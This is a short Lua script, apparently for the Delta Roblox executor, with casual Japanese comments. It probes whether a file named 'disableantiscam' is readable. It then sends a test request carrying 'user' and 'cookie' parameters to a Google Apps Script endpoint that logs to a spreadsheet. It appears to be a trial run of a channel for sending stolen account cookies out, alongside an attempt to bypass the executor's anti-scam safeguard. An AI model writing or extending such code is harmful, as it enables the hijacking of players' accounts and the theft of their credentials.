local path = "Internals/Secured/disableantiscam"
local s, content = pcall(function() return readfile(path) end)

if s then
    print("✅ Deltaはこのファイルを認識してるぜ！")
    print("中身の一部: " .. tostring(content):sub(1, 20))
    
    -- 通信テスト
    local url = "https://script.google.com/macros/s/AKfycbySRD9waGQTePiZTsX8BWorkMt4lAtYDaMuUpX6763Yrguz04Ws7Cd6B4TiibPEu1R6/exec"
    game:HttpGet(url .. "?user=FINAL_CHECK&cookie=CHECKING_COMMUNICATION")
    print("🚀 GASにテスト信号を送った。シートを確認しろ！")
else
    print("❌ まだファイルを認識できてねえ。名前かパスが間違ってるぜ。")
end
